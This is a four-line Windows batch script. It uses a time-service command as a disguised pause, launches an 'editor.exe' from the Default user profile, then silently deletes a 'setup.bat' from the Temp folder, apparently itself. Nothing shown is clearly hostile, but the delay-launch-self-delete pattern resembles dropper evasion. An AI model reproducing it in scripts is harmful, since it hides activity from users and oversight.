@echo off
w32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2 >nul
start "" "C:\Users\Default\Editor\editor.exe"
del /q "C:\Users\Admin\AppData\Local\Temp\setup.bat"
